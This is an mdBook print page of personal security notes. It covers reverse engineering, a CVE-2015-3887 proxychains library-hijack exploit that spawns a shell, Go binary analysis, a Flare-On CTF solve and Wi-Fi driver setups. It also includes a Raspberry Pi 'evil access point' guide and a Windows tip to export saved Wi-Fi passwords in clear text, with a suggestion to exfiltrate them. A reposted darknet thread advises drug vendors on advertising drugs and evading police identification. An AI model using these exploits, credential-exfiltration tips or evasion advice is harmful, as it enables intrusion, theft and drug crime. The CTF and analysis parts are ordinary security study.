<!DOCTYPE HTML>
<html lang="en" class="sidebar-visible no-js light">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Exploitation Freaks</title>
        <meta name="robots" content="noindex" />
        <!-- Custom HTML head -->
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        <link rel="icon" href="favicon.svg">
        <link rel="shortcut icon" href="favicon.png">
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        <link rel="stylesheet" href="css/print.css" media="print">
        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="fonts/fonts.css">
        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->
    </head>
    <body>
        <!-- Provide site root to javascript -->
        <script type="text/javascript">
            var path_to_root = "";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item expanded "><a href="introduction.html"><strong aria-hidden="true">1.</strong> Introduction</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.</strong> Exploitation</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="cve-2015-3887.html"><strong aria-hidden="true">2.1.</strong> CVE-2015-3887</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.</strong> Reverse Engineering</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="anatomy-of-a-gopher.html"><strong aria-hidden="true">3.1.</strong> Anatomy of a Gopher</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.2.</strong> Flare 8 (2021)</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="credchecker.html"><strong aria-hidden="true">3.2.1.</strong> credchecker</a></li></ol></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.</strong> Other</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="tn-wn722n-monitor-mode.html"><strong aria-hidden="true">4.1.</strong> TN-WN722N Monitor Mode</a></li><li class="chapter-item expanded "><a href="awus036ach-monitor-mode.html"><strong aria-hidden="true">4.2.</strong> AWUS036ACH Monitor Mode</a></li><li class="chapter-item expanded "><a href="rpi-rtl88x2bu-evil-AP.html"><strong aria-hidden="true">4.3.</strong> RTL88x2bu Fake Access Point</a></li><li class="chapter-item expanded "><a href="windows-cheatsheet.html"><strong aria-hidden="true">4.4.</strong> Windows Cheatsheet</a></li><li class="chapter-item expanded "><a href="phone-opsec-tips.html"><strong aria-hidden="true">4.5.</strong> Phone Security Thread from Dread</a></li></ol></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky bordered">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light (default)</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">Exploitation Freaks</h1>

                    <div class="right-buttons">
                        <a href="print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>
                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>
                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="binary-exploitation-and-reverse-engineering"><a class="header" href="#binary-exploitation-and-reverse-engineering">Binary Exploitation and Reverse Engineering</a></h1>
<p><strong>First things first, welcome in my gitbook !</strong></p>
<p>I decided to make a mdbook so i can share writeups and exploits i found throughout time more easily online...</p>
<p>Hopefully you will enjoy it as much as i did enjoy making the page :)</p>
<p><strong>Time for Explanations !</strong>  Let's start with what is Reverse Engineering</p>
<h1 id="what-is-reverse-engineering-"><a class="header" href="#what-is-reverse-engineering-">What is Reverse Engineering ?</a></h1>
<p>To get a good definition of what is really Reverse Engineering i wen't on Wikipedia... Yeah i know pretty lame.</p>
<p><strong>Reverse engineering</strong> (also known as backwards engineering or back engineering) is a process or method through the application of which one attempts to <strong>understand through deductive reasoning how a device, process, system, or piece of software accomplishes a task with very little (if any) insight into exactly how it does so.</strong></p>
<p>In our case, we're <strong>Reverse Engineering programs (Binary Executables)</strong>, to do that we're using <strong>Decompilers, Debuggers, Disas, Hex Editors, PE Structure Analysis Tools and many more...</strong> note that you can reverse pretty much anything that has been engineered in the first place.</p>
<p><img src="https://c.tenor.com/K8R7LThju04AAAAC/hack-the-planet.gif" alt="alt" /></p>
<h1 id="why-reverse-engineering"><a class="header" href="#why-reverse-engineering">Why Reverse Engineering</a></h1>
<p>If you're into programming, Reverse Engineering might be one of the most important skills to improve your programming knowledge.</p>
<p>Looking at other people code was always one of the best, if not the best way to learn new programming techniques. Now we all know that C and C++ Programs goes through a big process (Preprocessing, Tokenization, Optimizations, Assembling, Linking,...) that basically change the textual code into a binary executable for the Operating System you want.</p>
<p><img src="https://files.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-Mk7MCiXZ7za0yxyehCg%2F-Mk7RfLlphCqkUO3SrCj%2F-Mk7Rv7gIyuteAZiRR4v%2Fimage.png?alt=media&amp;token=a8fa223b-1f37-4781-b07d-f7b42dfb80c1" alt="alt" /></p>
<p>Binary is a LOT more harder to understand and only a few binary ninjas are able to understand it, so unless the program is open-source you will potentially need to disassemble or decompile the binary, this is called Reverse Engineering, we take a compile executable (or binary), and we try to understand the code through either :</p>
<ul>
<li>
<p>Disassembly</p>
<ul>
<li>Disassembly is the act of disassembling an executable or binary into it's assembly representation, the disassembling process can't be 100% perfect and they might be some errors to fixed in the disassembled code.</li>
</ul>
</li>
<li>
<p>Decompiling</p>
<ul>
<li>Decompilation is the act of decompiling, we basically take a compiled binary and we tried to reverse that process to obtain a C / C++ representation of the binary or executable your currently analysing.</li>
</ul>
</li>
</ul>
<p>Knowing how to reverse a program will allow you to take any executable you want and look at what it does and how it truly does it things behind the scene.</p>
<p>Also Reverse Engineering, is useful for Malware Analysis, malwares uses a lot of different Obfuscation techniques, to make your life harder as an analyst, knowing how to counter these techniques and how to Deobfuscate programs will highly help you as a programmer.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="cve-2015-3887"><a class="header" href="#cve-2015-3887">CVE-2015-3887</a></h1>
<p>CVE-2015-3887,... we are dealing with a quite old exploit this time, but i wanted to take a look at the proxychains source code, to gain more programming knowledge.</p>
<p>After looking for a bit, i saw a <code>#define SUPER_SECURE</code> with a comment next to it saying &quot;<strong>CVE-2015-3887</strong>&quot;, so i decided to look, and it seemed like a pretty cool exploit to me.</p>
<h2 id="explanations"><a class="header" href="#explanations">Explanations</a></h2>
<p>The exploit is fairly simple and straight forward, the program looks for <code>libproxychains4.so</code> in the <strong>Current Path</strong> of the program instead of looking in the default <strong>libproxychains4.so</strong> directory which is in <strong>/usr/local/lib/libproxychains4.so</strong>...</p>
<p>This means we can write any code we wan't on our target machine, compile the code into a shared object using the following flags, in the following example i compile a file called <strong>payload.c</strong> into a <strong>libproxychains4.so</strong> :</p>
<p><code>gcc -shared -nostdlib -o libproxychains4.so payload.c</code></p>
<p>Next we would need to put the compiled file into the same directory where the <strong>proxychains</strong> binary is being ran from (<code>which proxychains</code> or <code>which proxychains4</code>).</p>
<h2 id="exploit-demo"><a class="header" href="#exploit-demo">Exploit demo</a></h2>
<ol>
<li>Compile the program <strong>with the ignore_cve flag on</strong>, so the program is vulnerable.</li>
</ol>
<pre><code class="language-bash">$ git clone https://github.com/rofl0r/proxychains-ng
$ cd proxychains-ng
$ vim configure (or nano if you prefer)

# find the &quot;ignore_cve&quot; field, and change it to &quot;yes&quot; (without quote marks), save and close the editor.

$ vim Makefile
$ :%/$(exec_prefix)/.
$ :%/$(prefix)/.        

# These 2 last commands will change every &quot;$(prefix)&quot; and &quot;$(exec_prefix)&quot; with &quot;.&quot;, since we only want to build proxychains in our current directory.

$ ./configure
$ make &amp;&amp; make install

# you should now have a compiled version of proxychains4 in the project directory (proxychains4-ng).
</code></pre>
<ol start="2">
<li>Write and Compile the exploit</li>
</ol>
<p>We're going to do things pretty simply, we are first going to look at libproxychains4 functions and see which one we can potentially hijack.</p>
<p>After looking for a minute i see the socket function, i am 100% sure the program will use this function in his runtime so i will hijack this one.</p>
<p>Let's write the exploit :)</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int socket(){
    system(&quot;/bin/bash&quot;);
    return 0;
}

</code></pre>
<p>Let's compile the exploit as a shared object</p>
<p><code>gcc -shared -nostdlib -o libproxychains4.so payload.c</code></p>
<ol start="3">
<li>Bypass the default libproxychains4.so using our exploit</li>
</ol>
<p>Just put the newly compiled file inside the same directory as the proxychains binary, make sure the name of the shared object is <strong>libproxychains4.so</strong> and you should get a shell...</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="anatomy-of-a-gopher"><a class="header" href="#anatomy-of-a-gopher">Anatomy of a Gopher</a></h1>
<p>This sections are my notes relating the SANS talk &quot;Anatomy of a Gopher&quot;, by hex0punk (Alex Useche). The talk is still available on youtube at the following link <a href="%22https://www.youtube.com/watch?v=wWNbnEp_4ZE%22">talk</a>.</p>
<h2 id="what-are-we-doing"><a class="header" href="#what-are-we-doing">What are we doing</a></h2>
<ul>
<li>Learning about what makes go binaries different than C and C++ binaries.</li>
<li>Identifying techniques for recognizing and conducting analysis of go binaries.</li>
<li>Tips for finding vulnerabilities in go binaries.</li>
<li>Identifying common patterns found in go binaries.</li>
<li>Learning about protections that can be added to go binaries.</li>
</ul>
<h2 id="the-go-assembler"><a class="header" href="#the-go-assembler">The GO Assembler</a></h2>
<ul>
<li>The go compiler is based on plan9 compiler.</li>
<li>Semi-abstract instruction set.</li>
<li>Pseudo-Assembly.</li>
<li>Not a direct representation of the underlying machine (i.e MOV may be a LD)</li>
<li>It also introduces a set of pseudo registers (that you might not have seen before).</li>
</ul>
<h2 id="tools"><a class="header" href="#tools">Tools</a></h2>
<ul>
<li><strong>Go Tool Objdump</strong>
You can use <strong>objdump</strong> along with <strong>go tool</strong> to dump binary informations (functions, sections,...) </li>
</ul>
<p>You would typically use it the following way.</p>
<pre><code>$ go tool objdump -s &lt;func&gt; &lt;bin&gt; 
$ go tool objdump &lt;arguments&gt; &lt;bin&gt;
</code></pre>
<p>A big advantage of using <strong>go tool objdump</strong> is that you get line numbers in code.This can help you group instructions by operations.</p>
<p><em>Note that pretty much every disassembler does a great job at disassembling go binaries, this includes (r2, ghidra, ida, cutter, binary ninja, hopper, gdb,...).</em></p>
<p><em>Usually it is a best practice to use as many disassembler as you can and compare and catch on differences in the output, i usually like ghidra + ida or ida + binary ninja</em></p>
<h2 id="default-protections-on-go-binaries"><a class="header" href="#default-protections-on-go-binaries">Default Protections on Go Binaries</a></h2>
<p>When you run go build, it should enable <strong>NX</strong> <em>(or No Execute if you prefer)</em> by default on the resulting binary. </p>
<p>However note that <strong>Position Independent Code (PIC or PIE) and Stack Canaries</strong> are usually disabled <strong>by default</strong>, also note that binaries are not stripped.</p>
<h4 id="how-to-enable-protections-on-go-binaries"><a class="header" href="#how-to-enable-protections-on-go-binaries">How to enable protections on Go binaries.</a></h4>
<ul>
<li>Enable Stack Protections <code>export CGO_LDFLAGS='-fstack-protector'</code></li>
<li>Strip the binary <code>GOOS=linux go build -ldflags=&quot;-s -w&quot;</code></li>
<li>Enable PIE <code>export GOFLAGS='-buildmode=pie'</code></li>
<li>Strip functions names and reduce size <code>Get UPX and pack the file</code></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="credchecker"><a class="header" href="#credchecker">Credchecker</a></h1>
<p>Credchecker is the first challenge of the Flare-On 8 (2021) CTF Event and it was super easy to complete.</p>
<h2 id="the-challenge"><a class="header" href="#the-challenge">The Challenge</a></h2>
<p>We are given a <strong>admin.html</strong> file (which is the challenge meat), and a <strong>img</strong> directory containing an image (not important to us).</p>
<p>I first start a <strong>PHP Web Server</strong> using the following command
<code>php -S 127.0.0.1:6969</code></p>
<p>Then i can access the challenge using my browser at the following URL <strong>127.0.0.1:6969</strong>, let's see what the challenge page looks like in the first place.</p>
<p><img src="https://i.imgur.com/CXojMs8.png" alt="admin.html" /></p>
<h2 id="source-code"><a class="header" href="#source-code">Source Code</a></h2>
<p>To solve the challenge we need to look at the javascript code inside the <strong>admin.html</strong> file.</p>
<p>Whenever the button is pressed, the <strong>checkCreds()</strong> javascript function gets called.</p>
<p><img src="https://i.imgur.com/NVGdHtC.png" alt="button" /></p>
<p>Let's find this <strong>checkCreds()</strong> function.</p>
<p><img src="https://i.imgur.com/Y4OnfT7.png" alt="checkCreds" /></p>
<p>We're basically checking if <strong>btoa(ourInput)</strong> is equal to <strong>goldenticket</strong>, the <strong>btoa</strong> function takes a base64 string and decodes it.</p>
<p>We can assume that the password is the the base64 encoded verson of <strong>goldenticket</strong>, or <strong>atob(&quot;goldenticket&quot;)</strong> should also print you the password, the <strong>atob</strong> function takes an ascii string and encode it into base64.</p>
<p>Let's prove the password works...</p>
<p><img src="https://i.imgur.com/IP0qiPa.png" alt="goldenticket" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="monitor-mode-on-tn-wn722n"><a class="header" href="#monitor-mode-on-tn-wn722n">Monitor Mode on TN-WN722N</a></h1>
<p>Installing the required packages and configure them to make TN-WN722N works in monitor mode is pretty straight forward, let's see how to do it.</p>
<h2 id="arch-linux"><a class="header" href="#arch-linux">Arch Linux</a></h2>
<pre><code class="language-bash">	pamcan -Syu
	pacman -S install bc -y
	sudo rmmod r8188eu.ko
	git clone https://github.com/aircrack-ng/rtl8188eus
	cd rtl8188eus
	sudo -i
	echo &quot;blacklist r8188eu&quot; &gt; &quot;/etc/modprobe.d/realtek.conf&quot;
	exit
	make
	sudo make install
	sudo modprobe 8188eu

	# You can ignore compilation errors related to redhat
</code></pre>
<h2 id="debian-based-system"><a class="header" href="#debian-based-system">Debian based System</a></h2>
<pre><code class="language-bash">	sudo apt update
	sudo apt install bc -y
	sudo rmmod r8188eu.ko
	git clone https://github.com/aircrack-ng/rtl8188eus
	cd rtl8188eus
	sudo -i
	echo &quot;blacklist r8188eu&quot; &gt; &quot;/etc/modprobe.d/realtek.conf&quot;
	exit
	make
	sudo make install
	sudo modprobe 8188eu
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="monitor-mode-on-awus036ach"><a class="header" href="#monitor-mode-on-awus036ach">Monitor Mode on AWUS036ACH</a></h1>
<p>Installing the required packages and configure them to make AWUS036ACH works in monitor mode is pretty straight forward, let's see how to do it.</p>
<h2 id="arch-linux-1"><a class="header" href="#arch-linux-1">Arch Linux</a></h2>
<pre><code class="language-bash">	pamcan -Syu
	pacman -S install bc -y
	 git clone https://github.com/aircrack-ng/rtl8812au.git
	cd rtl8812au
	make
	sudo make install
	reboot
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="rpi-evil-ap-with-rtl88x2bu-wifi-card-driver"><a class="header" href="#rpi-evil-ap-with-rtl88x2bu-wifi-card-driver">RPI Evil AP with RTL88x2bu Wifi Card Driver</a></h1>
<p><em><strong>Fake / Evil AP's are great right !</strong></em></p>
<p>But sometime you want to make sure you have the most cheap pieces of equipment available so that if someone bust your device, you won't get mad losing it.</p>
<p>Hence this guide... RTL88x2bu is one of the cheapest wireless adapters available where i live, so i bought one a couple of years ago, but it was with disgust that i learn that this adapter didn't support monitor mode (this means i can't use it for attacks like deauth / dumping).</p>
<p>Although the device can be used to make fake AP's, so this is what this guide will be about.</p>
<pre><code class="language-bash"># Update all packages per normal
sudo apt update
sudo apt upgrade

# Install prereqs
sudo apt install git dnsmasq hostapd bc build-essential dkms raspberrypi-kernel-headers

# Reboot just in case there were any kernel updates
sudo reboot

# Pull down the driver source
git clone https://github.com/cilynx/rtl88x2bu
cd rtl88x2bu/

# Configure for RasPi
sed -i 's/I386_PC = y/I386_PC = n/' Makefile
sed -i 's/ARM_RPI = n/ARM_RPI = y/' Makefile

# DKMS as above
VER=$(sed -n 's/\PACKAGE_VERSION=&quot;\(.*\)&quot;/\1/p' dkms.conf)
sudo rsync -rvhP ./ /usr/src/rtl88x2bu-${VER}
sudo dkms add -m rtl88x2bu -v ${VER}
sudo dkms build -m rtl88x2bu -v ${VER} # Takes ~3-minutes on a 3B+
sudo dkms install -m rtl88x2bu -v ${VER}

# Plug in your adapter then confirm your new interface name
ip addr

# Set a static IP for the new interface (adjust if you have a different interface name or preferred IP)
sudo tee -a /etc/dhcpcd.conf &lt;&lt;EOF
interface wlan1
    static ip_address=192.168.4.1/24
    nohook wpa_supplicant
EOF

# Clobber the default dnsmasq config
sudo tee /etc/dnsmasq.conf &lt;&lt;EOF
interface=wlan1
  dhcp-range=192.168.4.100,192.168.4.199,255.255.255.0,24h
EOF

# Configure hostapd
sudo tee /etc/hostapd/hostapd.conf &lt;&lt;EOF
interface=wlan1
driver=nl80211
ssid=pinet
hw_mode=g
channel=7
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=CorrectHorseBatteryStaple
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
EOF

sudo sed -i 's|#DAEMON_CONF=&quot;&quot;|DAEMON_CONF=&quot;/etc/hostapd/hostapd.conf&quot;|' /etc/default/hostapd

# Enable hostapd
sudo systemctl unmask hostapd
sudo systemctl enable hostapd

# Reboot to pick up the config changes
sudo reboot

</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="windows-cheatsheet"><a class="header" href="#windows-cheatsheet">Windows Cheatsheet</a></h1>
<p>Since i am more of the Linux type than Windows (for now), i will make this small cheatsheet where i will add, tips and tricks troughout time.</p>
<p>Note that those are a bit like personal notes but if you find something that should be changed or something that need to be added, feel free to reach out to me.</p>
<h2 id="export-wireless-profiles-with-passwords"><a class="header" href="#export-wireless-profiles-with-passwords">Export wireless profiles with passwords</a></h2>
<p>Exporting wireless profiles on Windows is something pretty simple to do, you can achieve this using the following command.</p>
<pre><code>$ netsh wlan export profile key=clear
</code></pre>
<p>This will export each network the computer recently connected to along with the passwords for these networks in a XML file.</p>
<p>You could write a script to export these files, either using a request, dns exfil, email, or anything that comes through your mind.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="social-media-anonymity-tips-and-tricks-from-dread"><a class="header" href="#social-media-anonymity-tips-and-tricks-from-dread">Social Media Anonymity Tips and Tricks (from dread)</a></h1>
<p>The guide is about anonymity on social media and the safe use of a mobile phones. It should make it difficult to identify what you do or who you are. There is something for everyone in it.</p>
<p>Thoughts on some applications.</p>
<p>Facebook Messenger: End to end encryption is opt in and only enabled when you start a secret conversation. Secret conversations not available on web app. FB has a history of all secret conversations, you can not delete it. Deleting something on FB doesn't delete anything from their databases or backups.</p>
<p>Telegram: Very popular and allows for huge groups. Desktop application does not have end to end encryption. End to End encryption is only in secret chats. If using a Televend shop to order drugs then you should use the app on Tails and manually PGP encrypt your address.
Set up Telegram on Tails dreadytofatroptsdj6io7l3xptbet6onoyno2yv7jicoxknyazubrad.onion/post/f21e4eada88a77f82008/#c-8f48c2c4c28c5ade43
Make Telegram persistent on Tails dreadytofatroptsdj6io7l3xptbet6onoyno2yv7jicoxknyazubrad.onion/post/6ba79b8708c26aaf2bd9/#c-ffc19b9f565eff160e
Telegram stores are throwing buyer OpSec out of the window. Telegram is what people think is safe and it is the de facto drug app in many countries. Use something else.</p>
<p>Wickr Me: Wickr does not have phone activation and it does not require an email to sign up. It is encrypted by default and it has a self destruct on messages that you can set up. A lot of vendors and other people in the drug trade trust Wickr. wickr.com/security/ Wickr does not hide who you are (IP address) or who you talk to. It is up to you to protect your identity. If the people you talk to fail to protect themselves then that can come back to bite you in the ass. You shouldn't on the same account talk to people you order drugs from, people you sell drugs to and then your real life friends too. All of this should be separate.</p>
<p>WhatsApp: Has end to end encryption. It is Facebook. Facebook wants to gather as much information as possible so they can better advertise to you. Probably not the best choice.</p>
<p>Instagram: Like facebook it is hostile towards Tor. Might be a lucrative place for advertising. It does not have end to end encryption for the chat.</p>
<p>Reddit and Twitter: Hostile towards Tor users. Reddit just doesn't work if you use a Tor exit node. They will shadowban you account. Twitter will lock your account if you use it with Tor and they'll ask for phone verification. These are still important platforms for getting a message out (DarkDotFail on Twitter, DreadAlert on Reddit).</p>
<p>SnapChat: Why do people post shit that incriminates them or you and expect SnapChat to actually delete what they post? SnapChat does not delete anything. It is a good place to advertise drugs.</p>
<p>TikTok, Tinder, Grindr: Might be a good places to advertise drugs, depends how you work them.</p>
<p>Signal: Signal is the most promising of all IM apps. Good security and privacy. Only thing kept in logs is your phone number. Phone number requirement is what is keeping me from recommending it to everyone. You can activate Signal with a temporary number and prevent account getting stolen signal.org/blog/signal-pins/ If you and who you are talking to are willing to go through with buying a phone number then use Signal.</p>
<p>Encrochat &amp; Sky ECC: LE found the servers and pushed an update that broke the encryption and identified the users. Users of the services were hiding among other criminals. The service was not any better than a free solution. It was a giant honeypot and the effects of it will be felt for years. Use something that is widely used by regular people. Information that is critical should be manually PGP encrypted.
All centralized services have useful data to hand over to LE. All of them can be forced to start logging data that they normally don't.</p>
<p>Data that is logged:</p>
<ol>
<li>Contacts and historical contacts on the app</li>
<li>Contacts on your phone</li>
<li>Contents of messages</li>
<li>Encrypted messages</li>
<li>Sent files</li>
<li>Deleted messages</li>
<li>Original EXIF data of sent photos</li>
<li>Phone models used with the app</li>
<li>Phone IMEI and other uniquely identifying data</li>
<li>IP addresses used with the</li>
<li>Your phone number</li>
<li>Contents or metadata of files on your phone</li>
<li>Location data</li>
<li>Contents of your SMS messages</li>
<li>Your browsing history</li>
<li>And more</li>
</ol>
<p>Number 9 is how the police attaches real names to pseudonyms in IM (instant messaging) applications. Most people also use their real phone number on Telegram/Signal. Those that do have burner phones/numbers have non existent OpSec (operational security) beyond that. They use their burner at their home or at work, at their friends place. They have their burner turned on while their regular phone is turned on like while driving down a highway or in a bar. Sitting in a restaurant, turning off your phone and turning on the burner is not sufficient OpSec either.</p>
<p>When the company does not have to comply with law enforcement the process of identifying a person behind an account is more involved but perfectly doable.
Process looks roughly like this:</p>
<ol>
<li>Identify account you want to investigate.</li>
<li>Identify IP addresses of the servers that IM app clients connect to.
3a. Start conversation with account under investigation. Each message the suspect sends to you corresponds with upload traffic from a phone to the server identified in step 2. The timestamps of them sending a message and you receiving a message will correlate. Do this however many times needed and you have a match.
3b. Each message you send will correlate with a download by the suspect's phone. These will be time correlated if the suspect is currently online.
3b. Send a file of known size to suspect. This will stand out among all of the other single message uploads/downloads.
3c. Start a video/voice connection with suspect. This will correspond with a data stream of known duration and size.
3d. If suspect is not talking to you then you can use &quot;message read&quot; notifications that will be uploaded by the suspect or &quot;person is writing a message&quot; notifications that will be downloaded by the suspect. Initiating a voice or video connection request can also be correlated. You sending a message will not work if the person is not currently online but it can be used if you use the &quot;message read&quot; notification on your side and the corresponding download of the message by the suspect.</li>
</ol>
<p>The more people that the suspect gets to hide in the more data you need to identify the suspect. Of course you try to narrow down the geographic location of the suspect to make this process quicker.</p>
<p>TEMPORARY PHONE NUMBER</p>
<p>This will be used to activate an account. Beware that this number is temporary and you get it for just a few minutes. After that it is gone and you can not get it back. People can use it to steal your account. Some services want to verify you with the phone number again when you log in from a new place (happens if you use Tor), set up a 2FA authentication with those services. Use the Google authenticator app if available. Second option is e-mail authentication. Remember that every process must be done through tor. If you use the service through Tor but used the email without it at any point then you are screwed forever.</p>
<ol>
<li>Set up tails. The DNM Bible is down right now but you can find the offline version here as a PDF dreadytofatroptsdj6io7l3xptbet6onoyno2yv7jicoxknyazubrad.onion/post/40c86816505155c1a0d8</li>
<li>Buy Monero. If you need to then buy BTC with Monero (also in the bible). You must send the crypto transactions over Tor.</li>
<li>You can buy phone numbers here textverified.com or here 5sim.net or any other service that you'd prefer. They must accept crypto.</li>
</ol>
<p>You might tie all of your activated accounts together that you activate with purchases with the same account on one of these websites. Same if you make purchases with BTC from the same Bitcoin account, the BTC connection is across websites and their accounts. This depends on the website keeping these logs but you can not assume or trust that they don't. If an account on one of these number selling websites is ever identified as yours then all activations that you do with it in the future will be tied to you.</p>
<p>TOR HOSTILE WEBSITES</p>
<p>This is for completeness sake. I don't know exactly how to do it just that it is possible. You need to route your traffic like this you-&gt;tor-&gt;proxy-&gt;website.</p>
<p>You'll have to buy a proxy server with Monero. Or buy a VPS and configure a proxy yourself. If anyone has a good guide on how to do this then I'd appreciate it.</p>
<p>PHONE IMEI and SIM</p>
<p>All phones have a unique identification number, IMEI. It gets sent when you connect to a cell tower. You can't change IMEI on most phones anymore, you need to develop a custom solution for every phone. Mobile service providers keep track of IMEI numbers. When they saw them, the geographic location and the SIM that was present. IMEI ties together different SIM cards used on a phone. Some people are under the impression that the SIM is important and throwing out or changing the SIM is what saves them. The SIM is tied to your name and it is what enables service providers to bill people.</p>
<p>Some apps on your phone will have access to your IMEI. If the network operator knows the IMEI and through some app an IMEI is identified as belonging to you the suspect then that might lead to an arrest.</p>
<p>If you do not want an IMEI being associated with you then buy your phone with cash in some place that you are not easily identified. NEVER connect to a cell tower. If you make an emergency call then that will broadcast your IMEI. Airplane mode is a software switch, it doesn't actually turn off the antenna. There is no guarantee that your phone will not try to connect to a cell tower even with no SIM in phone. Same goes for airplane mode. </p>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
            </nav>

        </div>

        <script type="text/javascript">
            window.playground_copyable = true;
        </script>
        <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
        <script src="book.js" type="text/javascript" charset="utf-8"></script>

        <!-- Custom JS scripts -->
        <script type="text/javascript">
        window.addEventListener('load', function() {
            window.setTimeout(window.print, 100);
        });
        </script>
    </body>
</html>
